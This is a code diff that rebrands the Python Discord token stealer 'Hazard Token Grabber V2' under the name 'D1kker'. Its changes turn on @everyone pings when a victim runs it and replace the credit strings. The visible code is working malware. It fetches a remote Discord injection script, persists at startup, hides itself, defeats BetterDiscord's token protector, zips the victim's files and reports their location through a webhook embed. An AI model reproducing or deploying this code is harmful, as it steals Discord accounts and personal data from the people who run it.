@@ -34,9 +34,9 @@ __config__ = {
     # keep it as it is unless you want to have a custom one
     "injection_url": "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
-    "ping_on_run": False,
+    "ping_on_run": True,
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    "kill_processes": True,
+    "kill_processes": False,
     # if you want the file to run at startup
     "startup": True,
     # if you want the file to hide itself after run
@@ -427,7 +427,7 @@ class HazardTokenGrabberV2(Functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, "a") as f:
                 f.write(
-                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo"
+                    "\n\n//DukkeD1kker just shit on this token protector | D1kker#0001"
                 )
 
     async def bypassBetterDiscord(self):
@@ -436,7 +436,7 @@ class HazardTokenGrabberV2(Functions):
             x = self.hook_reg
             with open(bd, "r", encoding="cp437", errors="ignore") as f:
                 txt = f.read()
-                content = txt.replace(x, "RdimoTheGoat")
+                content = txt.replace(x, "D1kkerTheGoat")
             with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                 f.write(content)
 
@@ -796,15 +796,15 @@ GoogleMaps: {self.googlemap}
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n"
+                                "😈・Grabber By D1kker・D1kker#0001\n\n"
                             )
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
                                 x
-                                + "\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                                + "\n\n😈・Grabber By D1kker・D1kker#0001"
                             )
 
-        _zipfile = ntpath.join(self.appdata, f"Hazard.V2-[{Victim}].zip")
+        _zipfile = ntpath.join(self.appdata, f"D1kker.Grabber-[{Victim}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -824,13 +824,13 @@ GoogleMaps: {self.googlemap}
         fileCount = f"{file_count} Files Found: "
 
         embed = {
-            "avatar_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1006844732376354827/1111802614091370516/D1kkerLogo.gif",
             "embeds": [
                 {
                     "author": {
-                        "name": f"*{Victim}* Just ran Hazard Token Grabber.V2",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
-                        "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif",
+                        "name": f"*{Victim}* Just ran D1kker Token Grabber",
+                        "url": "https://www.pornhub.com",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1006844732376354827/1111802614091370516/D1kkerLogo.gif",
                     },
                     "color": 176185,
                     "description": f"[Google Maps Location]({self.googlemap})",
@@ -883,7 +883,7 @@ GoogleMaps: {self.googlemap}
                         },
                     ],
                     "footer": {
-                        "text": "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                        "text": "😈・Grabber By D1kker・D1kker#0001"
                     },
                 }
             ],
